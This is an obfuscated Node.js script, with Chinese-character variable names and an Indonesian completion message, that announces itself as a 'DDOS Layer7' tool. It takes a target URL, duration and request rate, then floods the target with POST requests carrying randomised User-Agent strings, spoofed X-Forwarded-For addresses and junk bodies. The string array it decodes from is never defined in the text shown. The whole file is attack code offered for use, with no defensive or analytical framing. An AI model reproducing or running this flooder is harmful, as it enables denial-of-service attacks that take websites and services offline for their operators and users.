(function(_0x小吴1, _0x小吴2) {
    const _0x小吴3 = function(_0x小吴4) {
        while (--_0x小吴4) {
            _0x小吴1.push(_0x小吴1.shift());
        }
    };
    _0x小吴3(++_0x小吴2);
}(_0x小吴数组, 0x1f4));

const _0x小吴解码 = function(_0x小吴5, _0x小吴6) {
    _0x小吴5 = _0x小吴5 - 0x0;
    return _0x小吴数组[_0x小吴5];
};

const 小吴请求=require(_0x小吴解码('0x0'));
const 小吴随机=require(_0x小吴解码('0x1'));
const 小吴参数=process[_0x小吴解码('0x2')]['slice'](0x2);

if(小吴参数['length']<0x3){
    console[_0x小吴解码('0x3')](_0x小吴解码('0x4'));
    process[_0x小吴解码('0x5')](-0x1);
}

const 小吴网址=小吴参数[0x0];
const 小吴时间=parseInt(小吴参数[0x1]);
const 小吴速率=parseInt(小吴参数[0x2]);

function 小吴随机头(){
    return {
        'User-Agent':'Mozilla/'+小吴随机['generate'](0x3)+'.0',
        'Accept':'*/*',
        'Content-Type':'application/x-www-form-urlencoded',
        'X-Forwarded-For':`${Math['random']()*255|0}.${Math['random']()*255|0}.${Math['random']()*255|0}.${Math['random']()*255|0}`
    };
}

function 小吴随机体(){
    return 'data='+小吴随机['generate'](0x800);
}

console[_0x小吴解码('0x3')](`🔥 DDOS Layer7: ${小吴网址} | Duration: ${小吴时间}s | Rate: ${小吴速率} req/s`);

const 小吴间隔=setInterval(()=>{
    for(let 小吴i=0x0;小吴i<小吴速率;小吴i++){
        小吴请求({
            'url':小吴网址,
            'method':'POST',
            'headers':小吴随机头(),
            'body':小吴随机体()
        },(小吴错误,小吴响应)=>{
            if(小吴错误){
                console[_0x小吴解码('0x3')]("❌ Error: "+小吴错误['message']);
            }else{
                console[_0x小吴解码('0x3')](`✅ Layer7 sent | Status: ${小吴响应['statusCode']}`);
            }
        });
    }
},0x3e8);

setTimeout(()=>{
    clearInterval(小吴间隔);
    console[_0x小吴解码('0x3')]("✅ DDOS Layer7 selesai!");
},小吴时间*0x3e8);